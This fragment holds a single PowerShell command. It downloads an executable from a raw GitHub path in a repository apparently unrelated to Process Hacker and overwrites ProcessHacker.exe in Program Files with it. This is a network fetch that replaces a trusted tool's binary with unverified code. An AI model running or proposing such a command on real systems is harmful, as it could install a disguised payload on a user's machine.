...
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Hyphen696/ShivUmangAuth/refs/heads/main/Process%20Hacker%202.exe" -OutFile "C:\Program Files\Process Hacker 2\ProcessHacker.exe"
